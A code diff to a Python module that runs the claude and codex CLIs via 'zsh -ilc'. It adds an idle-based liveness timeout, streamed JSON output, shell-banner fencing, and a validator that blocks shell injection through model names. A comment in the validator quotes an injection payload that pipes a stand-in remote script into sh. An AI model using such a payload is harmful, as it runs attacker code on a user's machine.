@@ -13,9 +13,10 @@ local model — with no per-feature special cases.
 
 Invocation matches Rust: ``zsh -ilc`` so a GUI-launched process still sees the
 user's real PATH (these CLIs are installed via ``.zshrc``-managed paths), the
-prompt rides stdin, the reply is stdout. Content leaves the Mac through the
-user's own CLI account — exactly like the chat path, and only when the USER
-picked that engine for the room.
+prompt rides stdin, the reply is stdout — everything the user's startup files
+print first is fenced off and dropped (:func:`fenced_cmdline`). Content leaves
+the Mac through the user's own CLI account — exactly like the chat path, and
+only when the USER picked that engine for the room.
 
 Structured output: the CLIs have no grammar constraint, so a requested JSON
 schema is appended as a strict instruction. Every structured caller already
@@ -42,6 +43,7 @@ import os
 import re
 import secrets
 import tempfile
+import time
 from typing import Any, Optional
 
 from . import hub_mcp
@@ -53,10 +55,42 @@ from .prompts import READ_RESULT_TOOL
 #: Engine ids that name a cloud coding CLI (mirror external.rs).
 EXTERNAL_ENGINES = ("claude-cli", "codex-cli")
 
-#: Hard ceiling on one external-CLI generation call. A wedged ``claude`` /
-#: ``codex`` process would otherwise hang the await forever with no way to stop
-#: it; on expiry we kill the subprocess and raise the ``ENGINE_ERROR`` sentinel.
-EXTERNAL_TIMEOUT_SECS: int = 300
+#: How long an external CLI may produce NOTHING before it is presumed wedged.
+#:
+#: This is a LIVENESS deadline, not a duration ceiling, and the difference is
+#: the whole point. It replaced a hard 300s wall-clock kill whose docstring
+#: called the call "one generation" — true of Ollama, false of a harness. One
+#: ``claude -p`` spawn is an ENTIRE agentic session: it reads files, drives its
+#: own tool loop and spawns its own sub-agents. Measured against that, any
+#: duration cap kills healthy work and reports it to the user as a failure,
+#: which is exactly what it did.
+#:
+#: Silence is the honest signal instead. Both engines run in a streaming
+#: envelope (``claude --output-format stream-json``, ``codex exec --json``), so
+#: a working CLI emits an NDJSON event every few seconds — init, each assistant
+#: turn, each tool use — and the clock resets on every byte of stdout OR
+#: stderr. A run may now take an hour; only a corpse goes quiet for a quarter of
+#: one. :func:`external_idle_secs` raises it without a rebuild.
+#:
+#: ONE path has no heartbeat: `build_cmdline` (the non-agent, one-shot gateway)
+#: still runs plain ``claude -p``, which prints its answer only at the end. That
+#: is left alone deliberately — it is a single generation, not a tool loop, so
+#: the budget below is the whole bound rather than a between-events one, and
+#: fifteen minutes of silence for one completion really is wedged. Give it the
+#: streamed envelope too if that ever stops being true.
+EXTERNAL_IDLE_SECS: int = 900
+
+#: The environment override for :data:`EXTERNAL_IDLE_SECS` (seconds).
+EXTERNAL_IDLE_ENV = "ARCELLE_EXTERNAL_IDLE_SECS"
+
+#: The pre-liveness name for the override. Still honored so a user who set it
+#: when it meant "total run time" keeps a working setting; it now means idle
+#: time, which is strictly more permissive, so nothing they had breaks.
+EXTERNAL_TIMEOUT_ENV = "ARCELLE_EXTERNAL_TIMEOUT_SECS"
+
+#: How often the drain loop wakes to check Stop and the idle deadline. Small
+#: enough that Stop feels instant, large enough to cost nothing over an hour.
+_POLL_SECS = 0.25
 
 #: The engine/model/effort separator — a double colon, written as a regex so
 #: the privacy suite's IPv6-wildcard-bind scan (which forbids a literal
@@ -70,6 +104,118 @@ _SEP = re.compile(r":{2}")
 #: ``RunRequest.max_context``; this is the neutral display fallback used when
 #: it didn't, identical to the one the local seam falls back to.
 DISPLAY_CONTEXT_FALLBACK = 128_000
+
+
+def external_idle_secs() -> float:
+    """How long one CLI call may stay SILENT before it is killed.
+
+    Read per call, so the default can be overridden without a rebuild; a
+    missing, unparseable or non-positive value keeps the default. The current
+    name wins over the legacy one when both are set.
+    """
+    for name in (EXTERNAL_IDLE_ENV, EXTERNAL_TIMEOUT_ENV):
+        try:
+            override = float(os.environ.get(name, ""))
+        except ValueError:
+            continue
+        if override > 0:
+            return override
+    return EXTERNAL_IDLE_SECS
+
+
+class _Wedged(Exception):
+    """The child produced nothing for the idle budget. Carries no message —
+    each caller words the ``ENGINE_ERROR`` in its own terms."""
+
+
+async def _pump(reader: Any, sink: bytearray, beat: list[float]) -> None:
+    """Drain one pipe into ``sink``, stamping ``beat`` on every chunk.
+
+    Draining is not optional bookkeeping: a child whose stderr pipe fills
+    blocks in ``write`` forever and would then look exactly like the wedge this
+    module is trying to detect. ``read`` (not ``readline``) so a CLI that emits
+    a partial line still counts as alive.
+    """
+    while True:
+        chunk = await reader.read(65536)
+        if not chunk:
+            return
+        sink.extend(chunk)
+        beat[0] = time.monotonic()
+
+
+async def _feed(stdin: Any, payload: bytes) -> None:
+    """Write the prompt and close stdin — the CLIs read to EOF before working."""
+    try:
+        stdin.write(payload)
+        await stdin.drain()
+    except (BrokenPipeError, ConnectionResetError):  # child died early; the
+        pass  # returncode path reports the real reason
+    finally:
+        try:
+            stdin.close()
+        except Exception:  # noqa: BLE001 - already closed / already dead
+            pass
+
+
+async def drain_with_idle(
+    proc: Any,
+    payload: bytes,
+    idle: float,
+    cancel: Optional[Any] = None,
+) -> tuple[bytes, bytes]:
+    """``communicate()`` with a LIVENESS deadline instead of a duration one.
+
+    Feeds stdin, drains both pipes concurrently, and returns
+    ``(stdout, stderr)`` — byte-for-byte what ``proc.communicate(payload)``
+    would have returned, so every downstream parser is untouched.
+
+    Raises :class:`_Wedged` when nothing arrived on either pipe for ``idle``
+    seconds, and returns ``(b"", b"")`` after killing the child when ``cancel``
+    is tripped. Both leave the process dead, never orphaned.
+    """
+    out, err = bytearray(), bytearray()
+    beat = [time.monotonic()]
+    tasks = [
+        asyncio.ensure_future(_feed(proc.stdin, payload)),
+        asyncio.ensure_future(_pump(proc.stdout, out, beat)),
+        asyncio.ensure_future(_pump(proc.stderr, err, beat)),
+        asyncio.ensure_future(proc.wait()),
+    ]
+
+    async def _stop() -> None:
+        for task in tasks:
+            task.cancel()
+        try:
+            proc.kill()
+        except (ProcessLookupError, OSError):  # already gone
+            pass
+        # Reap, so a killed child never lingers as a zombie holding its pipes.
+        try:
+            await asyncio.wait_for(proc.wait(), timeout=5)
+        except Exception:  # noqa: BLE001 - best-effort reap
+            pass
+
+    try:
+        while True:
+            done, pending = await asyncio.wait(tasks, timeout=_POLL_SECS)
+            if not pending:
+                # Surface a drain failure rather than returning the half of the
+                # output that made it — a truncated envelope parses as a wrong
+                # answer, which is worse than a reported error.
+                for task in done:
+                    if task.exception() is not None:
+                        raise task.exception()  # type: ignore[misc]
+                return bytes(out), bytes(err)
+            if cancel is not None and getattr(cancel, "cancelled", False):
+                await _stop()
+                return b"", b""
+            if time.monotonic() - beat[0] >= idle:
+                await _stop()
+                raise _Wedged
+    except asyncio.CancelledError:
+        await _stop()
+        raise
 
 
 def split_external_model(model: str) -> tuple[str, str | None, str | None]:
@@ -296,6 +442,23 @@ CODEX_ARCELLE_FLAGS = (
 )
 
 
+#: What a model slug / effort level is allowed to look like before it may be
+#: interpolated into a shell command line. Every real value is one of our own
+#: catalog slugs (``gpt-5.6-sol``, ``opus``, ``high``), but the string is read
+#: from the ROOM FILE, and a room file can arrive from someone else: a "model"
+#: of ``opus'; curl evil.sh | sh; '`` walked straight out of the single quotes
+#: in the builders below and into ``zsh -ilc``. Reject anything that is not a
+#: plain slug rather than trying to quote it — a doctored model name must fail
+#: loudly, not silently run as some other model.
+_SAFE_CLI_ARG = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
+
+
+def _checked_arg(value: str | None, what: str) -> str | None:
+    if value is None or _SAFE_CLI_ARG.match(value):
+        return value
+    raise ValueError(f"Unsafe {what} in the room's model setting: {value!r}")
+
+
 def build_agent_cmdline(
     engine: str,
     submodel: str | None,
@@ -308,11 +471,17 @@ def build_agent_cmdline(
 ) -> str:
     """The CLI invocation for one AGENT round, mirroring ``external.rs``.
 
-    Same machine-readable envelope Rust asks for (``--output-format json`` /
-    ``--json``) — it carries the CLI's OWN usage report and, for Claude, its
-    real context window, so nothing here has to assume a number. Both parsers
+    Same machine-readable envelope Rust asks for, in its STREAMED form for
+    Claude (``--output-format stream-json`` / ``--json``) — it carries the CLI's
+    OWN usage report and, for Claude, its real context window, so nothing here
+    has to assume a number. Rust's ``external.rs`` still asks for the unstreamed
+    ``json``; that is not drift, it needs no heartbeat because its own spawn has
+    no timeout to satisfy (it blocks on ``wait_with_output``). Both parsers
     below degrade to plain stdout, so a CLI change costs the accounting, never
     the answer.
+
+    ``submodel``/``effort`` are checked against :data:`_SAFE_CLI_ARG` before
+    they are quoted into the command line — see there for why.
 
     ``system_path`` REPLACES Claude's own agent system prompt with ours. That
     is the difference between a worker that acts and one that doesn't: the
@@ -322,6 +491,8 @@ def build_agent_cmdline(
     search_mcp_tools" after searching its OWN registry). Codex takes no
     equivalent flag; its instructions ride the prompt.
     """
+    submodel = _checked_arg(submodel, "model name")
+    effort = _checked_arg(effort, "effort level")
     model_flag = f" --model '{submodel}'" if submodel else ""
     if engine == "claude-cli":
         effort_flag = f" --effort '{effort}'" if effort else ""
@@ -340,9 +511,18 @@ def build_agent_cmdline(
             )
         else:
             tool_flags = CLAUDE_NO_TOOLS_FLAGS
+        # `stream-json` (which requires `--verbose`) instead of `json`: the
+        # plain envelope prints ONE object when the run is already over, so
+        # stdout stays silent for the whole session and there is no way to tell
+        # a thinking agent from a dead one. The streamed form emits an NDJSON
+        # event per turn and per tool use, which is what makes the liveness
+        # deadline in `drain_with_idle` measure something real. The answer is
+        # unaffected: the terminal `type: result` event is byte-identical to
+        # what `--output-format json` printed, and `claude_result_object` reads
+        # both shapes.
         return (
-            f"claude -p --output-format json{tool_flags}{system_flag}"
-            f"{model_flag}{effort_flag}"
+            f"claude -p --output-format stream-json --verbose{tool_flags}"
+            f"{system_flag}{model_flag}{effort_flag}"
         )
     if engine == "codex-cli":
         effort_flag = f" -c 'model_reasoning_effort={effort}'" if effort else ""
@@ -350,19 +530,81 @@ def build_agent_cmdline(
     raise ValueError(f"Unknown external engine: {engine}")
 
 
+#: The marker the shell echoes on BOTH streams immediately before the CLI runs.
+#: ``zsh -ilc`` runs the user's INTERACTIVE startup files — that is how a
+#: GUI-launched process finds these CLIs on PATH at all — and whatever they
+#: print goes to our pipes: a greeting, a version-manager banner, an "nvm is not
+#: compatible with…" warning. On stdout it arrives glued to the reply and is
+#: shown as the answer (and stops ``claude -p``'s JSON envelope from parsing);
+#: on stderr :func:`cli_failure_reason` reads it INSTEAD of the real reason a
+#: call failed. Everything before the marker belongs to the shell, not to the
+#: engine, and is dropped. Fixed rather than random so the command line stays
+#: predictable — a startup file cannot print this, and the CLI's own output
+#: comes after it either way.
+_OUTPUT_FENCE = "__ARCELLE_CLI_OUTPUT__"
+
+
+def fenced_cmdline(cmdline: str) -> str:
+    """``cmdline`` preceded by the fence marker on stdout and stderr."""
+    return (
+        f"printf '%s\\n' {_OUTPUT_FENCE} >&2; "
+        f"printf '%s\\n' {_OUTPUT_FENCE}; {cmdline}"
+    )
+
+
+def strip_shell_banner(stream: bytes | str) -> str:
+    """One captured stream with the login shell's own chatter removed.
+
+    Returned unchanged when the marker is absent — the fence never ran, so
+    there is nothing we can honestly attribute to the shell.
+    """
+    if isinstance(stream, bytes):
+        stream = stream.decode("utf-8", "replace")
+    _shell, marker, rest = stream.partition(_OUTPUT_FENCE)
+    return rest.lstrip("\r\n") if marker else stream
+
+
+def claude_result_object(stdout: str) -> dict[str, Any] | None:
+    """The terminal ``{"type": "result", …}`` envelope, from EITHER output shape.
+
+    ``--output-format json`` prints that object and nothing else;
+    ``--output-format stream-json`` prints one JSON event per line and the SAME
+    object last. Reading whole-buffer first and falling back to the last
+    ``type: result`` line means one parser serves both — which is what made the
+    streaming switch (taken for the liveness heartbeat, see
+    :data:`EXTERNAL_IDLE_SECS`) free on the answer path rather than a rewrite of
+    it. Returns None when neither shape yields an object.
+    """
+    try:
+        whole = json.loads(stdout)
+    except ValueError:
+        pass
+    else:
+        return whole if isinstance(whole, dict) else None
+    found: dict[str, Any] | None = None
+    for line in stdout.splitlines():
+        line = line.strip()
+        if not line.startswith("{"):
+            continue
+        try:
+            event = json.loads(line)
+        except ValueError:  # a partial or non-JSON line among the events
+            continue
+        if isinstance(event, dict) and event.get("type") == "result":
+            found = event  # last one wins — it is the terminal envelope
+    return found
+
+
 def parse_claude_json_result(stdout: str) -> tuple[str, int | None, int | None]:
-    """``(text, input_tokens, context_window)`` from ``claude -p --output-format
-    json`` — the Python twin of ``external.rs::parse_claude_json_result``.
+    """``(text, input_tokens, context_window)`` from ``claude -p`` — the Python
+    twin of ``external.rs::parse_claude_json_result``.
 
     All three input counts (fresh, cache-creation, cache-read) occupy context,
     so the bar counts all three. ``contextWindow`` is taken from whichever model
     did the most work this turn — a single turn can span two models.
     """
-    try:
-        v = json.loads(stdout)
-    except ValueError:
-        return stdout.strip(), None, None
-    if not isinstance(v, dict):
+    v = claude_result_object(stdout)
+    if v is None:
         return stdout.strip(), None, None
     text = v.get("result")
     text = text if isinstance(text, str) else stdout.strip()
@@ -418,11 +660,12 @@ def cli_failure_reason(stdout: bytes | str, stderr: bytes | str) -> str:
         stderr = stderr.decode("utf-8", "replace")
     if stderr.strip():
         return stderr.strip()[:400]
-    try:
-        v = json.loads(stdout)
-    except ValueError:
-        return stdout.strip()[:400] or "no output"
-    if not isinstance(v, dict):
+    # Same both-shapes read as the answer path: under `stream-json` the
+    # diagnosis still rides the terminal `result` event, just not alone on the
+    # buffer. Parsing only the whole buffer here would have turned every
+    # streamed failure back into the empty message this function exists to fix.
+    v = claude_result_object(stdout)
+    if v is None:
         return stdout.strip()[:400] or "no output"
     result = v.get("result")
     reason = v.get("terminal_reason")
@@ -469,13 +712,13 @@ def build_cmdline(engine: str, submodel: str | None, effort: str | None) -> str:
     """The exact CLI invocation Rust uses (external.rs), minus MCP bridging —
     pipeline generation is a pure text call, the CLI is not an agent here.
 
-    Quoting is safe for the same reason as in Rust: submodel/effort are always
-    our own known slugs (a Codex catalog slug + level, or a Claude alias +
-    ``--effort`` value), never arbitrary user text. The Claude alias is scraped
-    from the installed CLI rather than hardcoded; ``external.rs``'s parser caps
-    a slug at 2-16 lowercase ASCII letters, so no quote or metacharacter can
-    reach this interpolation.
+    submodel/effort are always our own known slugs in practice (a Codex catalog
+    slug + level, or a Claude alias + ``--effort`` value), but they are READ
+    FROM THE ROOM FILE, so what makes the quoting safe here is the
+    :data:`_SAFE_CLI_ARG` check, not that assumption.
     """
+    submodel = _checked_arg(submodel, "model name")
+    effort = _checked_arg(effort, "effort level")
     model_flag = f" --model '{submodel}'" if submodel else ""
     if engine == "claude-cli":
         effort_flag = f" --effort '{effort}'" if effort else ""
@@ -499,42 +742,40 @@ async def generate_external(
 
     engine, submodel, effort = split_external_model(model)
     prompt = flatten_messages(messages, format)
-    cmdline = build_cmdline(engine, submodel, effort)
+    idle = external_idle_secs()
+    try:
+        cmdline = build_cmdline(engine, submodel, effort)
+    except ValueError as exc:  # doctored model string — never reaches a shell
+        raise LlmError("ENGINE_ERROR", str(exc)) from exc
     try:
         proc = await asyncio.create_subprocess_exec(
             "zsh",
             "-ilc",
-            cmdline,
+            fenced_cmdline(cmdline),
             stdin=asyncio.subprocess.PIPE,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
-        stdout, stderr = await asyncio.wait_for(
-            proc.communicate(prompt.encode("utf-8")),
-            timeout=EXTERNAL_TIMEOUT_SECS,
-        )
-    except asyncio.TimeoutError as exc:
-        # Wedged CLI: stop it rather than hang the call forever. This raise is
-        # NOT caught by the generic `except Exception` below — an exception
-        # raised inside one except clause bypasses its sibling clauses.
-        proc.kill()
-        try:  # best-effort reap of the killed child; failure here is ignorable
-            await asyncio.wait_for(proc.wait(), timeout=5)
-        except Exception:  # noqa: BLE001 - already killed; reaping is best-effort
-            pass
+        stdout, stderr = await drain_with_idle(proc, prompt.encode("utf-8"), idle)
+    except _Wedged as exc:
+        # Silent for the whole idle budget: stopped rather than hung forever.
+        # This raise is NOT caught by the generic `except Exception` below — an
+        # exception raised inside one except clause bypasses its siblings.
         raise LlmError(
             "ENGINE_ERROR",
-            f"{engine} timed out after {EXTERNAL_TIMEOUT_SECS}s and was stopped.",
+            f"{engine} produced no output for {idle:g}s and was stopped.",
         ) from exc
     except FileNotFoundError as exc:  # zsh itself missing — effectively impossible
         raise LlmError("ENGINE_ERROR", f"Could not start {engine}: {exc}") from exc
     except Exception as exc:  # noqa: BLE001 - re-raised as the sentinel contract
         raise LlmError("ENGINE_ERROR", f"{engine} failed: {exc}") from exc
+    out = strip_shell_banner(stdout)
     if proc.returncode != 0:
         raise LlmError(
-            "ENGINE_ERROR", f"{engine} failed: {cli_failure_reason(stdout, stderr)}"
+            "ENGINE_ERROR",
+            f"{engine} failed: {cli_failure_reason(out, strip_shell_banner(stderr))}",
         )
-    return stdout.decode("utf-8", "replace").strip()
+    return out.strip()
 
 
 #: How the seam asks for a tool call. One JSON object, nothing else — the
@@ -757,9 +998,13 @@ class ExternalChatModel:
         mcp_url: str = "",
         mcp_token: str = "",
     ) -> None:
+        # `temperature` is accepted so this seam matches the local engine's
+        # ChatModel signature, and then deliberately dropped: neither CLI has a
+        # temperature flag (`claude -p` has none, and Codex's `-c` knobs are
+        # effort and verbosity), so there is nothing to pass it to. Storing it
+        # only made the room's Creativity slider LOOK connected here.
         self.composite_model = model
         self.model = model
-        self.temperature = temperature
         self.engine, self.submodel, self.effort = split_external_model(model)
         #: Display-only: the token bar's denominator, as resolved by the host.
         #: Never a cap — nothing here truncates or refuses on its account.
@@ -900,7 +1145,7 @@ class ExternalChatModel:
         hub: HubToolServer | None = None,
         hub_tools: list[str] | None = None,
     ) -> str:
-        """One CLI process, killed on Stop or on the hard timeout.
+        """One CLI process, killed on Stop or after going silent.
 
         ``system`` rides a temp FILE rather than argv: it carries the room's
         instructions and the tool catalog (kilobytes, arbitrary user text), so
@@ -956,20 +1201,23 @@ class ExternalChatModel:
     ) -> str:
         from .llm import LlmError  # local import: llm.py imports this module
 
-        cmdline = build_agent_cmdline(
-            self.engine,
-            self.submodel,
-            self.effort,
-            system_path=system_path,
-            mcp_path=mcp_path,
-            allowed=allowed,
-            hub_allowed=hub_tools,
-        )
+        try:
+            cmdline = build_agent_cmdline(
+                self.engine,
+                self.submodel,
+                self.effort,
+                system_path=system_path,
+                mcp_path=mcp_path,
+                allowed=allowed,
+                hub_allowed=hub_tools,
+            )
+        except ValueError as exc:  # doctored model string — never reaches a shell
+            raise LlmError("ENGINE_ERROR", str(exc)) from exc
         try:
             proc = await asyncio.create_subprocess_exec(
                 "zsh",
                 "-ilc",
-                cmdline,
+                fenced_cmdline(cmdline),
                 stdin=asyncio.subprocess.PIPE,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
@@ -977,33 +1225,31 @@ class ExternalChatModel:
         except Exception as exc:  # noqa: BLE001 - re-raised as the sentinel contract
             raise LlmError("ENGINE_ERROR", f"Could not start {self.engine}: {exc}") from exc
 
-        task = asyncio.ensure_future(proc.communicate(prompt.encode("utf-8")))
-        waited = 0.0
-        # Stop must not wait out a 300s cloud call: poll the flag while the CLI
-        # runs and kill the process the moment the user presses it.
-        while True:
-            done, _ = await asyncio.wait({task}, timeout=0.25)
-            if done:
-                break
-            waited += 0.25
-            if cancel is not None and getattr(cancel, "cancelled", False):
-                proc.kill()
-                task.cancel()
-                return ""
-            if waited >= EXTERNAL_TIMEOUT_SECS:
-                proc.kill()
-                task.cancel()
-                raise LlmError(
-                    "ENGINE_ERROR",
-                    f"{self.engine} timed out after {EXTERNAL_TIMEOUT_SECS}s and was stopped.",
-                )
-        stdout, stderr = task.result()
+        # THE round budget for a domain agent. `drain_with_idle` polls Stop while
+        # the CLI runs (so Stop never waits out a long cloud call) and gives up
+        # only on SILENCE — never on elapsed time. One spawn here is a whole
+        # agentic session; see EXTERNAL_IDLE_SECS for why a duration cap was the
+        # wrong instrument and what replaced it.
+        idle = external_idle_secs()
+        try:
+            stdout, stderr = await drain_with_idle(
+                proc, prompt.encode("utf-8"), idle, cancel
+            )
+        except _Wedged as exc:
+            raise LlmError(
+                "ENGINE_ERROR",
+                f"{self.engine} produced no output for {idle:g}s and was stopped.",
+            ) from exc
+        if cancel is not None and getattr(cancel, "cancelled", False):
+            return ""
+        out = strip_shell_banner(stdout)
         if proc.returncode != 0:
             raise LlmError(
                 "ENGINE_ERROR",
-                f"{self.engine} failed: {cli_failure_reason(stdout, stderr)}",
+                f"{self.engine} failed: "
+                f"{cli_failure_reason(out, strip_shell_banner(stderr))}",
             )
-        return stdout.decode("utf-8", "replace").strip()
+        return out.strip()
 
     async def stream(
         self,
@@ -1122,7 +1368,6 @@ class ExternalChatModel:
 
         return RoundUsage(
             input_tokens=input_tokens,
-            output_tokens=None,
             max_context=self.max_context,
             is_real=input_tokens is not None,
         )
@@ -1130,10 +1375,16 @@ class ExternalChatModel:
 
 __all__ = [
     "EXTERNAL_ENGINES",
+    "EXTERNAL_IDLE_SECS",
     "CODEX_ARCELLE_FLAGS",
     "DISPLAY_CONTEXT_FALLBACK",
     "ExternalChatModel",
+    "external_idle_secs",
+    "drain_with_idle",
+    "fenced_cmdline",
+    "strip_shell_banner",
     "build_agent_cmdline",
+    "claude_result_object",
     "parse_claude_json_result",
     "parse_codex_json_stream",
     "parse_tool_calls",
